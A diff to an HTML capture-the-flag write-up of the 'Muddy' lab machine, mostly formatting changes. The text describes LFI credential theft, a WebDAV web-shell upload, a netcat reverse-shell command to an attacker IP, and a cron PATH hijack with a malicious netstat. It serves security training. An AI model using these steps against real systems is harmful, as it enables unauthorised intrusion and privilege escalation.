@@ -84,6 +84,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 
     <img src="../images/muddy/port80.png">
 
+    <br>
+    <br>
+
     <li>When we visit the web server on port 80, http://192.168.248.161 it redirects us to muddy.ugc and says page cannot be found.  In order to fix this, we add "192.168.248.161 muddy.ugc" to our /etc/hosts file.  After changing this and revisiting port 80 we find a wordpress site.  The first thing I do is try to login as admin, but the login page does not exist.  Then I try wpscan against it but nothing vulnerable turns up.  Finally I run gobuster against it and get this:</li>
 
     <pre>
@@ -129,9 +132,14 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
     <li>The /webdav directory stands out.  If we can gain access to the webdav service we can possibly upload a webshell and gain RCE that way.  We visit this page and it asks for a username and password.  I tried a few combos but nothing worked.  We will note this for later.</li>
 
+    <br>
+
     <li>The web service on port 8888 is our first point of interest.</li>
 
     <img src="../images/muddy/port8888.png">
+
+    <br>
+    <br>
     
     <li>On this page we see a Ladon service.  We click on the link "muddy" and find a page with available interfaces and a method called "checkout".  When we check searchsploit for exploits for Ladon we are presented with this.</li>
 
@@ -209,9 +217,7 @@ xmlns:urn=\&quot;urn:checkout\&quot;&gt;&lt;soapenv:Header/&gt;
 
     <h2><a id="www-data">Shell - www-data</a></h2>
 
-    <p>Now that we have a working LFI exploit we will use it to gain more information to gain shell access to the host.  Thinking back to the muddy.ugc/webdav directory, there are likely credentials for basic auth on the web server.  We can find these credentials in /var/www/html/webdav/passwd.dav</p>
-
-    LFI for passwd.dav file</li>
+    <li>Now that we have a working LFI exploit we will use it to gain more information to gain shell access to the host.  Thinking back to the muddy.ugc/webdav directory, there are likely credentials stored for basic auth on the web server.  We can find these credentials in /var/www/html/webdav/passwd.dav and use LFI to access them.</li>
 
     <pre>
  &#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Muddy/exfiltrated]
@@ -252,10 +258,14 @@ xmlns:urn=\&quot;urn:checkout\&quot;&gt;&lt;soapenv:Header/&gt;
 
     <img src="../images/muddy/hashcat.png">
 
+    <br>
+    <br>
 
     <li>We have successfully cracked the hash.  The password is "sleepless".  Now we have the webdav login username "administrant" and the password "sleepless".  We can use the tool cadaver to connect to webdav and upload a web shell.</li>
 
-    <li>Webshell contents:</li>
+    <br>
+
+    <li>Web shell contents:</li>
 
     <pre>
 &#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Muddy/exfiltrated]
@@ -276,9 +286,7 @@ Uploading shell.php to `/webdav/shell.php&#039;:
 Progress: [=============================&gt;] 100.0% of 35 bytes succeeded.
     </pre>
 
-    <p>Now that we have our webshell uploaded we can access it by going to http://muddy.ugc/webdav and logging in with administrant:sleepless.  Once we login we get access to the page with our webshell, shell.php.  Now we can get our reverse shell using netcat.  I setup my reverse listener on port 80 and then sent this through my browser: http://muddy.ugc/webdav/shell.php?cmd=nc -nv 192.168.49.248 80 -e /bin/bash</p>
-
-    <li>Receiving reverse shell and upgrading the shell for pty, clear command, and autocomplete.</li>
+    <li>Now that we have our webshell uploaded we can access it by going to http://muddy.ugc/webdav and logging in with administrant:sleepless.  Once we login we get access to the page with our webshell, shell.php.  Now we can get our reverse shell using netcat.  I setup my reverse listener on port 80 and then sent this through my browser: http://muddy.ugc/webdav/shell.php?cmd=nc -nv 192.168.49.248 80 -e /bin/bash</li>
 
     <pre>
 &#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Muddy/exfiltrated]
@@ -337,7 +345,9 @@ PATH=/dev/shm:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 *  *    * * *   root    netstat -tlpn &gt; /root/status &amp;&amp; service apache2 status &gt;&gt; /root/status &amp;&amp; service mysql status &gt;&gt; /root/status
     </pre>
 
-    <p>The cronjob is calling for the program netstat without an absolute path.  So we look at the PATH variables and see if we can write to any of them.  /dev/shm is a directory that we can commonly write to as an unprivileged user.  So in order to exploit this, we will create a malicious executable named netstat and place it in this directory.  I use msfvenom to create this.</p>
+    <li>The cronjob is calling for the program netstat without an absolute path.  So we look at the PATH variables and see if we can write to any of them.  /dev/shm is a directory that we can commonly write to as an unprivileged user.  So in order to exploit this, we will create a malicious executable named netstat and place it in this directory.  I use msfvenom to create this.</li>
+
+    <br>
 
     <li>Creating malicious netstat</li>
 
